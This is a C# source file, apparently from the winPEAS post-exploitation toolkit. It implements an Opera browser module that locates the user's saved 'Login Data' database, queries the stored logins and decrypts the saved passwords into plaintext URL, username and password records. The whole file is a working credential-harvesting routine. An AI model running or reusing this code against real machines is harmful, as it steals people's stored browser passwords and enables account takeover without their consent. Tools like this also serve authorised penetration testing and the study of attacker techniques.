using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using winPEAS.KnownFileCreds.Browsers.Decryptor;
using winPEAS.KnownFileCreds.Browsers.Models;
using winPEAS._3rdParty.SQLite;

namespace winPEAS.KnownFileCreds.Browsers.Opera
{
    internal class Opera : BrowserBase, IBrowser
    {
        public override string Name => "Opera";

        private const string LOGIN_DATA_PATH = "\\..\\Roaming\\Opera Software\\Opera Stable\\Login Data";

        public override void PrintInfo()
        {
            PrintSavedCredentials();
        }

        public override IEnumerable<CredentialModel> GetSavedCredentials()
        {
            var result = new List<CredentialModel>();

            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
            var p = Path.GetFullPath(appdata + LOGIN_DATA_PATH);

            if (File.Exists(p))
            {
                SQLiteDatabase database = new SQLiteDatabase(p);
                string query = "SELECT action_url, username_value, password_value FROM logins";
                DataTable resultantQuery = database.ExecuteQuery(query);

                if (resultantQuery.Rows.Count > 0)
                {
                    var key = GCDecryptor.GetOperaKey();

                    foreach (DataRow row in resultantQuery.Rows)
                    {
                        byte[] nonce, ciphertextTag;
                        byte[] encryptedData = Convert.FromBase64String((string)row["password_value"]);
                        GCDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                        var pass = GCDecryptor.Decrypt(ciphertextTag, key, nonce);

                        string actionUrl = row["action_url"] is System.DBNull ? string.Empty : (string)row["action_url"];
                        string usernameValue = row["username_value"] is System.DBNull ? string.Empty : (string)row["username_value"];

                        result.Add(new CredentialModel()
                        {
                            Url = actionUrl,
                            Username = usernameValue,
                            Password = pass
                        });
                    }

                    database.CloseDatabase();
                }
            }
            else
            {
                throw new FileNotFoundException("Cannot find Opera logins file");
            }
            return result;
        }
    }
}
